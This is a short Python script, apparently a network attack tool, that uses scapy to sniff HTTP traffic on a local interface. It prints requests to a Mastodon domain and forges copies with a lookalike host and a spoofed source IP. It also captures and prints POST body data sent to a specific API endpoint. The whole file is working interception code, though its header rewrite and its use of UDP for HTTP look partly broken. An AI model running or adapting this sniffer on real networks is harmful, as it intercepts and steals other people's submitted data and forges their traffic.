from scapy.all import *
import re

def sniffData(pkt):
    if pkt.haslayer( Raw ):
        header = pkt.getlayer( Raw ).load
        if header.startswith(bytes('GET', 'utf-8')) or header.startswith(bytes('POST', 'utf-8')):
            if bytes('www.mastodon.org', 'utf-8') in header:
                src = pkt.getlayer(IP).src
                print(header)
                print('------------------------------------')
                fakeheader = header.decode()
                fakeheader = fakeheader.replace("ww.mastodon.org","www.mastoodon.org", 2)
                fakeheader = bytes(fakeheader, 'utf-8')
                
                send(IP(dst='10.44.0.7',src='192.168.0.20')/UDP(dport=80)/fakeheader, iface='enp0s20f0u1u4')
                if header.startswith(bytes('POST', 'utf-8')):
                    if bytes('/api/ServicesConnection.php', 'utf-8') in header:
                        print(header)
                        data = header.split(bytes('\r\n\r\n','utf-8'))[1]
                        print(("[%s] POST data Captured: %s" % (src, data)))
                        print('------------------------------------')
sniff(iface="enp0s20f0u1u4", prn=sniffData)